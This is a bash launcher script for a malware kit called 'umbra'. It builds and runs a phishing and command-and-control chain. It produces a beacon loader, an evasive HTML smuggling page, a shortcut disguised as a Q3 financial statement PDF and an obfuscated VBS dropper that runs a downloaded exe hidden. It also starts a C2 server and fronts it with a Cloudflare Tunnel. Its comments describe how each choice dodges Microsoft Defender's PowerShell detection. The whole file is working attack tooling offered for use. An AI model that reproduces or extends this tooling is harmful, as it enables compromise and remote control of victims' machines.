#!/usr/bin/env bash
# run.sh - umbra all-in-one launcher for Kali (thin wrapper).
#
# This does NOT re-implement the build: it just calls the real scripts so there
# is exactly one source of truth for the config (scripts/umbra.env) and one
# correct build path (scripts/build.sh, which re-packs cmd/beacon/config.go).
#
# Usage:
#   bash scripts/run.sh build    # config + loader.exe + delivery site + .lnk (reflect)
#   bash scripts/run.sh vbs      # ALSO build the obfuscated .vbs dropper (no PowerShell)
#   MODE=curl bash scripts/run.sh build   # .lnk with cmd+curl cradle (no PowerShell)
#   bash scripts/run.sh serve    # static origin (scripts/serve.sh)
#   bash scripts/run.sh c2       # C2 server (foreground, operator console)
#   bash scripts/run.sh tunnel   # Cloudflare Tunnel (foreground)
#   bash scripts/run.sh verify   # check the public edge
#   bash scripts/run.sh status   # quick health/artefact summary
#   bash scripts/run.sh clean    # wipe dist/
#   bash scripts/run.sh all      # build, start serve+c2, then tunnel in foreground
#
# Everything is relative to the module root (this script's parent dir).
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$ROOT_DIR"

ENV_FILE="$ROOT_DIR/scripts/umbra.env"
if [[ ! -f "$ENV_FILE" ]]; then
    cp "$ENV_FILE.example" "$ENV_FILE"
    echo "[!] created $ENV_FILE from example - edit DOMAIN/PORTS before using it"
fi
# shellcheck disable=SC1090
set -a; source "$ENV_FILE"; set +a

DOMAIN="${DOMAIN:-c2.example.com}"
HTTP_PORT="${HTTP_PORT:-8082}"
C2_BIND="${C2_BIND:-127.0.0.1}"
C2_PORT="${C2_PORT:-8443}"
C2_PASS="${C2_PASS:-change-me-passphrase}"

# The reflect-mode cradle holds powershell.exe alive for the whole beacon
# lifetime (-Wait -WaitSeconds 0), so make_lnk_payload.sh must run in reflect
# mode. stage mode is the unproven Donut/blob path.
export MODE="${MODE:-reflect}"

say() { printf '\033[1;34m[INFO]\033[0m %s\n' "$*"; }
ok()  { printf '\033[1;32m[OK]\033[0m %s\n'   "$*"; }
err() { printf '\033[1;31m[ERROR]\033[0m %s\n' "$*" >&2; }

need() { command -v "$1" >/dev/null 2>&1 || { err "$1 not found in PATH"; exit 1; }; }

do_clean() {
    say "cleaning dist/"
    rm -rf dist/*
    ok "clean done"
}

do_build() {
    need go
    need python3
    # build.sh: packs cmd/beacon/config.go from umbra.env (SERVER/SLEEP/JITTER/PASS),
    # builds dist/loader.exe, builds the evasive self-contained index.html
    # (make_smuggle.py) and stages reflect.ps1 + the disguised direct-exe copy
    # (PAYLOAD_NAME) into dist/.
    bash scripts/build.sh
    # C2 server for THIS host (Linux on Kali). build.sh only builds the beacon.
    say "building C2 server (native)"
    go build -trimpath -ldflags "-s -w" -o dist/server ./cmd/server
    # .lnk (reflect cradle: reflect.ps1 text + loader.exe bytes, -Wait -WaitSeconds 0)
    bash scripts/make_lnk_payload.sh
    echo
    ok "artefacts:"
    ls -lh dist/server dist/loader.exe dist/reflect.ps1 dist/index.html \
           dist/2026-Q3_Financial_Statement.pdf.lnk \
           dist/2026-Q3_Financial_Statement.pdf.exe 2>/dev/null
}

do_vbs() {
    need python3
    # make_vbs_payload.sh: obfuscated WSH dropper (wscript -> XMLHTTP ->
    # ADODB.Stream -> %TEMP%\<rand>.exe -> WScript.Shell.Run hidden).
    # No PowerShell anywhere in the chain, so PS command-line ML detections
    # (Trojan:Win32/Commando.AIml) have nothing to fire on.
    bash scripts/make_vbs_payload.sh
    ls -lh dist/*.vbs 2>/dev/null || true
}

do_serve()  { need python3;  exec python3 scripts/serve.py "$HTTP_PORT"; }
do_c2()     { exec ./dist/server -listen "$C2_BIND:$C2_PORT" -pass "$C2_PASS" -certdir dist/c2data; }
do_tunnel() { bash scripts/cf_tunnel.sh; }
do_verify() { bash scripts/verify.sh; }

do_status() {
    say "=== umbra status ==="
    if [[ -f dist/server && -f dist/loader.exe && -f dist/reflect.ps1 \
          && -f dist/2026-Q3_Financial_Statement.pdf.lnk ]]; then
        ok "artefacts present"
        ls -lh dist/loader.exe dist/reflect.ps1 dist/2026-Q3_Financial_Statement.pdf.lnk
    else
        err "artefacts missing - run: bash scripts/run.sh build"
    fi
    curl -s "http://127.0.0.1:$HTTP_PORT/" >/dev/null 2>&1 \
        && ok "static origin up on :$HTTP_PORT" || err "static origin down (scripts/serve.sh)"
    curl -sk "https://127.0.0.1:$C2_PORT/" >/dev/null 2>&1 \
        && ok "C2 up on $C2_BIND:$C2_PORT" || err "C2 down (scripts/run.sh c2)"
    if curl -sI "https://$DOMAIN/" 2>/dev/null | grep -qi cloudflare; then
        ok "tunnel active for $DOMAIN"
    else
        err "tunnel not detected for $DOMAIN (scripts/run.sh tunnel)"
    fi
    echo
    say "hint: run 'bash scripts/run.sh verify' to check the PUBLIC edge"
}

do_all() {
    do_build
    echo
    say "starting static origin on :$HTTP_PORT and C2 on $C2_BIND:$C2_PORT"
    mkdir -p dist
    nohup python3 scripts/serve.py "$HTTP_PORT" > dist/serve.log 2>&1 &
    SERVE_PID=$!
    nohup ./dist/server -listen "$C2_BIND:$C2_PORT" -pass "$C2_PASS" -certdir dist/c2data > dist/c2.log 2>&1 &
    C2_PID=$!
    sleep 2
    ok "serve.py PID $SERVE_PID (dist/serve.log)   c2 PID $C2_PID (dist/c2.log)"
    echo
    say "starting Cloudflare Tunnel in the foreground (Ctrl+C closes the tunnel;"
    say "the two services keep running - kill them with the PIDs above)"
    bash scripts/cf_tunnel.sh
    kill "$SERVE_PID" "$C2_PID" 2>/dev/null
}

case "${1:-all}" in
    clean)  do_clean ;;
    build)  do_build ;;
    vbs)    do_vbs ;;
    serve)  do_serve ;;
    c2)     do_c2 ;;
    tunnel) do_tunnel ;;
    verify) do_verify ;;
    status) do_status ;;
    all)    do_all ;;
    *)
        cat >&2 <<EOF
Usage: bash scripts/run.sh [build|vbs|serve|c2|tunnel|verify|status|clean|all]

  build   config + dist/loader.exe + disguised .exe copy + evasive index.html + .lnk
          (tip: MODE=curl bash scripts/run.sh build -> .lnk with a curl
           cradle - no PowerShell, dodges Commando.AIml PS ML)
  vbs     also build the obfuscated .vbs dropper (wscript -> XMLHTTP ->
          ADODB.Stream -> %TEMP% exec; no PowerShell at all)
  serve   static origin (foreground)
  c2      C2 server + operator console (foreground)
  tunnel  Cloudflare Tunnel (foreground)
  verify  check the public edge
  status  health/artefact summary
  clean   wipe dist/*
  all     build, then serve+c2 in background, tunnel in foreground (default)
EOF
        exit 1
        ;;
esac
